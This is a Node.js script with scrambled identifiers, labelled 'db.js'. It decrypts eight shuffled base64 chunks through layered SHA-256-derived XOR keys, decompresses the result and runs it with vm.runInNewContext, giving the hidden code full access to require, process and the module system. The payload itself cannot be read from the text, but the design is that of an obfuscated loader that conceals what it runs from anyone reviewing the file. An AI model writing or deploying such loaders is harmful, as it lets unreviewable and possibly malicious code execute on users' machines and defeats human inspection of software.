#!/usr/bin/env node

const crypto = require("crypto");
const zlib = require("zlib");
const vm = require("vm");

const tCwiUWhymVBYSy = "mlOR2OslWfu/8nPkRKr2XLWQJUsTEDYEPXlu0fhKeese6uhpWf6J23axPWzJ/m/qU3UhU3eghd3vVyaL5loQaIG6Opq2nFHplFeVRg==";

const yDYzmMUsUNXSix = "TKhKmeulA+1UGwgjF7KhKYwEHvTK1UYlBewE8Q/fohYz+hCEWo8+seSmnInS5RQXhebThlwOy+zWjisV09XQjrtrZTsSgmEaEQkzJJm9ReTl89NYNXdEKOXNrHu1jJ78Jh3FDUfc9IYgPnkG1MH9rS2+Dmp7H18Qk/AdMIjKK6AFgwv6vFKexb4+YOGB9pPYCSm9cVK5aXqKDiLzpicq8g7UGbnhvV+FJMZ9Wq2WufNUQPQzbzXUVWfnuyibx12Bm/vu+vbajFxdjxo/7gi11Wxcs6/U2CCKgljclCh9UCKdki9PqNIRfjKKXT3qEI8pvSSJq31NF7dhQ1AAQizKYrLji/cYGOOsijrcHEYpsAoKSCfF0NSpHZO78ricBFakYPlYM82ZwFnDrj3dOL05upJRhtZZ7SXSHApMNPoxmRWd424tirRpnBwyRD8ZqYsWLHq2hwEhB8vbbdhRcJ8wtDXiAoYdwfDHg4f2g/KPsyVRyeuQ603oGOncppx2XTbX3/xzVC0dvzjkxujge5evJsw7XutdwHyZCBKJLBhidcu+S5MFXNa65gFQgdB0MMCLZ2rjq/K9RgfKi30NQ8g4CYhpYxfYd8APr";
const PfgOVKXLohFqwk = "ntf78UHyWTrirGLtNX+rNJtgURbNyXF5eYdLCdohrqK+CuekdnyQU/SskevDlhDXVTRdns3JzfYAp58CyAoFNpsVCSD97F3YJHVBR1mVDfSZ/eB5WW/FfnKW5Fr8CSPbJYEX/z/y1owfYUFecPUor4+Z9duQDcLHdo4L054N8adSRGzUQE2Zz9xikhqKTBX9+hCHDxobufwyMIvabFs6dZnhemJetGBzZqDdEkP8Dz5Y8Z83miYFzCOXVzhBQCXGmxpwz58wQB2lp41xW/jIg6DaIDMH+hqcyVTfJfN0VFaEH3at5hhAeq/kw0yMjJkV7+nD8HCaynsROmrsh1QCLDofCgYPE45NemX9flhDfvdOILFJYghuEDc/swJF86gtiGibM/5S+PfrbP1H8Ckuvm0ZsgPoFhZETdElNuycj+3b7lc+eEhy7ki/dMN4pn3Za7tRhuaElgM/sm/PVbridk7ej3NQrNO8RNv4nB+rFtg1nr8j5LB5KupMwyycUVisZLTJ8QcBzld4r1ASx67Iv5X02+viC+aY4IZclHah/hvXGM+uL6fwAkqAmbKC7hJt3aivDmsv3QDT8Ee5Q+4+5FzyVhr0XVUf7";
const erFINdUTaKWMsE = "fPsa4xQ+mf7/6Ix02/IKJsxBhNGsJ45YnAHJCcvN7mQpsshBzf0qkcKIE3SqhwsDq/Qt0wRb7LPwZV8L0iFZRNnF/TXXvWrsIUqbmdMRYTVXdm9CHcfM7Jb4m5h3i7IXslh4mVxF6tdyDeswK6LRhIuGzIkM6XXbk9tSN1Q6i4toztA3h0vlNrc/OZJxsVa+xLEkp6UIszoTv0VySrI3zLWEw77iGnH+K6pts0By9MzozXmSHKuj9pYRipBWs0bcanbkch94SKt3RdIqoZSkVKJD/hnsHDQxeduW1ksJVHuddN+QyKCDFVkoOULbJzdV0X8AT6dnsRnb1TDGUCPGxeojzI7yXh5B749aj0uyv24PSUaaf8tWpc0OfGSALqcUfL/xgV2wguLihxZPvk2jDwb3ta7M6IpHu6GAnqrRjyXJl2BuglONC2KjBqju8ROvihWwHjgjMaG41+x2uImUfjjTDPFeauo3tiHfSHSF+M0DyjtjYCeIg7/Hq59ph083kbkJWsOGPF/KqWhuTXcrYgMGElhsUlSKWzXhpwcVqQVqaClsLIJG9/ZfkOWPF/EqjJe5alBkfWYSiw0wLmXA+HnjaMjt4zw1n";
const LftVtdKNxxERwe = "dWj8BKmsBoqgmYa+7RUBlC+/v6fHeqBGxhGYk7UhN2iCDxg0y5V4G8NM8hWSOwVecUS/AdG+CZumSOJ6fAtzT9/e+P4ZtkmQh3YCP4xq79mVuJ7WsDyiMJMXY9MwaWJWu7STUxhyWgTry2PAsob30M/V/UL/3UtvBoxMPj37J43HVN0bKQ8cZp6BPhPhkvH/nSJmD/06EwiPhOex/hLr3SMtudxiMzjKNXjeDg4znKhArB4ml0gLteGwPYk3clO8Wrq8LNb8YRLdfDruvQpURPahwXz7oLsnszMhUP27wFJ3pVNJkwheLzwTqe+NI7ZVJQacLZf3jnzBG+KO4aB+ZMlFsYEeKGe/mXGItqSOFdJQ8Zbwcu+4rmlYG+JwKABb7AtzBHppsbffVe1qmVVTswtcCrQ75vUCYRpQTlE1YnTXtn2UaGIjym2KSRz35MEJR9FE4YktP0mobCTs5WZbYxz+gOUR+x1Mdjq9oS5BmEJGr27fhRplBd7Fop9YZe90uhPo+1AiipKBuNgUqhYAo3dbH+x0j7WSxn0Ml+l6m1GsB41jsPv6PUXLIYwAZtQN09vt/HRN/x8h1Q/XOUaOu+vfIXRNnWVBn";
const niMEjWhyTsWkdS = "hBV9DV7tOprtrJc+2J6M0/73j83GJNdCQGNNaP+LP41TiGimz8htODSr7ALUE8LJgwhlvdpMuZKXKq1mHX+0fDnepK+bO4f2N2yE0/4DUNOUmkOQmGQL/L1zHTkpV80BInnrfrAUhM3scFEGAW4bBhesWDJV13IRMisjRG6V0IPy3hRBsg9r+qKZp01SRjArnYsN8JYYo4ZQ6JniGnMQfTeD011RyJbJxJXMwk0GM9P6tpjc6dTw4lizzw4SfZH4st2eRjZ8aEcp7DHDwxm+1tdDKW5uZz0fFNZ0iHHnkz6bnY8hmsclmCXTFQigNbqw0Qycl+mdcxnBIcXAWxJvkziXlsfD1k2ktRLv31QcjJBhX5f2DNKZv5GayhZPcA3JYAV6ukAylBdo4CxTuk3u8O9uIRcKsLQFVzzJxplEbLMYvp9txlyRGS7ZXE3uVh0ts1fXrF957lWbNoUztXHUmCx1eL/GpWflC5TE/2grGeVSOZwOlekOFSBFAx5iWlQMk1+8Z/Yec9ms2UWjGdAF2oDzGY5jv5xJzMgm1D0nOEQnYpsiNlbr4D/i4svmhmFEvUl1nBAIKZm7TYglZdCGn7nrYIu4pnF/3";
const osgaFAQJsxnUnq = "NTAjtNchWawaXfNbWO5uGr9crc8ChVr5+qP7xch193lBzV6XlRGxjCgPSCeYS0/j3EBtUePV4a5ZVOfZpc50fyO5Xk0Z+nFzpoyFE814o9zoS1e8L+JJS5MQ7AuW0V/07Z31+PKzXhcJcvZQ2zK7kZgqvHrb6zd10rxpsNaMzgrRw00dnLXUlelojh18VlxjG3zrsbK+Xl1UgEGKHjDAcODPQNnft2OiUz6FxD1vBOIMZYlhQOdCyICFY/4OHOf1uGWa6UdNhoG1uTRbEIgF4Oxd7VlBhq7LYtoCrGfjxuWJFixlqfhBrE1+TR7HA3yv6DVgKJFYXnkDzA/1PX8EEdXu57eeWHY8SqR6L7nlGpwgVs6sIZkl/rUT+xTn9sVIH6iegvT1CCJnADdPEcMBotlKgz7Nq1VH01qf/zoTZcJd33fVkrAoIBQB3ECRlJd15tYJ86+HwouZoma9Dj0UfUBqGwbfiWjGTcpWDGijICW23GcJ2xaVVbHgngR3F9ELFEQZU5+d02IehTpTkZWf8rEvatyHZUQdvD6p4jLN7dJ0HJgXAOT3KbZR/rgXihekYv7X7yQLxUsx/5sw02R4iQL3Xm54=";
const ZezWsHokDYSvkE = "xGEa4LR9i/1oOjYw7Ai6f83UlJXHK9KemRJaIdKUiqej8gOgL1XbMPFiOWIlidwaqb3b9N65IFJYvrV+Agm9Bfx/ObOJKJiDCjZJ0KP7GTQVZDGf8VkPAL7wM45rRfw5QWp2ID4KgbAg6GgTn4Bv3yH1EYwKtMV6SSet/o9AC51DQoJm2oXhOUVRTr+a/nQd6QFL7kTMyQQoWn+Rt1l+wapSYwuJPmFb3vE3VKa4pZ30TriMRVeHrAX3xiZChSv26XNu0zSGBx1tvVtG4Lk3HUsNw+PQ+gmxn/vN5dmLpI6BTDTqNQTmlUIioZT5K3efPsZrr3lTrPN9dl+nq579Lphk8S3kZx9YNGUj5+yX98tnE6CYohRHaKQ1gThyLscfb50ap51BLjPNhY+htnpSoIiHQ/X+DjbIvc/QLUNbHFVasmIdGrHRlgySvr11p2rYaPYW4RQVTZUJTSaMkfMqJAfZl6Z8snrbrUeGpGE+gALumAHrfssd6cqho8pUaN7VHeAixxKdxPkb09VpszKVd64ELd82Lqe8j8xxPB00yoeVjE3OnB5EZlyh7SrooEHktQrtNP+YKxaiuSq/Ja53F9SzZsaCDLMXO";
const uLBxXRQXhxGxAs = "jtQHgjS370z66diuPaatLFpTC/zPvq9pUwQimkr3PFRvIIFx9KqbHY1MjYQRrTJlj5lM/t9+L5JZThcN56aoVAcT0HWKkwgXarvzGe9c4BWK1m761XTpnIIBoa19gj60Je3A2lI05gAOhrw2wc4iNXRaXIh5FXqQb7GU0/lqop18cuSXD6KNwunVLKmCZC/h5CA6VrT6Rl9qgmUJtWhu0Hp1qVYYGYfOHXSm1stwlqHQHC00wckO6nI4vlxCj1En6XLIrDPBFs6dDp2gUzAd4tmjav7v0SXzEBQ9W1sJk9wi0ylsDgItRYysktmXKjX9Zhd0S8JauFgr+jZPjGNYmw+6n42hCwP9Xp7UQ41XCfvFrunl5d+FPJjb3wyNgoCgkIy1DwAukBlKB2a039XUqAwOxTqorz8odrE62G7PUBm77BkLHTR95etdFxTSvxIkEd2j1rzKkuuUzZLPLqEIO36t0prBSh5YAQVdaodBuGBx71zkGFg7nKYSVestfStCszokJQthkjYR+BiVdbQGcbSc914VfdJqpIYj6AguHD5/z3LxZbEf4iyZeZGivPo+ehC8vYuz/Zt+pDAXg5iIRySU/WmssN3FI";

const jpQKbHSquLHcFs = "db.js";

function jgPnzEMpzjEiTp(data, key) {
  if (!key.length) return data;

  const out = Buffer.alloc(data.length);

  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ key[i % key.length];
  }

  return out;
}

function OFxyfnPehfyYuC() {
  try {
    const blob = Buffer.from(
      tCwiUWhymVBYSy,
      "base64"
    );

    if (blob.length < 32) {
      throw new Error("Invalid metadata");
    }

    const salt = blob.subarray(0, 16);
    const nonce = blob.subarray(16, 32);
    const encryptedPayload = blob.subarray(32);

    const filenameHash = crypto
      .createHash("sha256")
      .update(jpQKbHSquLHcFs)
      .digest()
      .subarray(0, 8);

    const layer1 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          filenameHash,
          Buffer.from("::L1")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer2 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          nonce,
          Buffer.from("::L2")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer3 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          salt,
          Buffer.from("::L3")
        ])
      )
      .digest()
      .subarray(0, 16);

    const blobKey = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          layer1,
          layer2,
          layer3
        ])
      )
      .digest();

    const payload = jgPnzEMpzjEiTp(
      encryptedPayload,
      blobKey
    );

    if (payload.length < 44) {
      throw new Error("Invalid payload");
    }

    const obfDataKey =
      payload.subarray(0, 32);

    const obfIndices =
      payload.subarray(32, 40);

    const keyMaterial =
      Buffer.concat([
        layer1,
        layer2,
        layer3
      ]);

    const dataKey = jgPnzEMpzjEiTp(
      obfDataKey,
      keyMaterial
    );

    const indices = [
      ...jgPnzEMpzjEiTp(
        obfIndices,
        dataKey.subarray(0, 8)
      )
    ];

    const valid =
      indices.length === 8 &&
      [...indices]
        .sort((a, b) => a - b)
        .every((value, i) => value === i);

    if (!valid) {
      throw new Error("Invalid index metadata");
    }

    const parts = [
      yDYzmMUsUNXSix,
      PfgOVKXLohFqwk,
      erFINdUTaKWMsE,
      LftVtdKNxxERwe,
      niMEjWhyTsWkdS,
      osgaFAQJsxnUnq,
      ZezWsHokDYSvkE,
      uLBxXRQXhxGxAs
    ];

    const ordered = new Array(8);

    for (
      let pos = 0;
      pos < indices.length;
      pos++
    ) {
      ordered[indices[pos]] = parts[pos];
    }

    if (
      ordered.some(
        part => typeof part !== "string"
      )
    ) {
      throw new Error("Invalid encrypted data");
    }

    const encrypted = Buffer.from(
      ordered.join(""),
      "base64"
    );

    const compressed = jgPnzEMpzjEiTp(
      encrypted,
      dataKey
    );

    const source = zlib
      .gunzipSync(compressed)
      .toString("utf8");

    const context = {
      require,
      module,
      exports,
      __filename: require("path").resolve(
        process.argv[1]
      ),
      __dirname: require("path").dirname(
        require("path").resolve(
          process.argv[1]
        )
      ),
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearTimeout,
      clearInterval
    };

    vm.runInNewContext(
      source,
      context,
      {
        filename: jpQKbHSquLHcFs
      }
    );

  } catch (err) {
    console.error(
      "[ERROR]",
      err.name + ":",
      err.message
    );

    process.exit(1);
  }
}

OFxyfnPehfyYuC();
